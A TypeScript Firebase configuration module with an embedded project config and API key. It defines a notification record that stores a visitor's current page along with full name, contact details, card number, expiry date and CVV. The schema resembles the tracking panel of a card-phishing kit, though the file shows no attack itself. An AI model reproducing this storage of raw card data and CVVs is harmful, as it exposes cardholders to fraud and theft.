import { initializeApp, getApps, getApp } from "firebase/app";
import { getAuth } from "firebase/auth";
import { getFirestore } from "firebase/firestore";
import { getDatabase } from "firebase/database";

const firebaseConfig = {
  apiKey: "AIzaSyA12e2QhQfP4sCkPTT68BWzGg-cNi3XAnk",
  authDomain: "maser-6b023.firebaseapp.com",
  projectId: "maser-6b023",
  storageBucket: "maser-6b023.firebasestorage.app",
  messagingSenderId: "490653042447",
  appId: "1:490653042447:web:b02e4bb5d1fee1f3caa07a",
  measurementId: "G-HLM57DQ155"
};;

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const database = getDatabase(app);

export { app, auth, db, database };

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
}


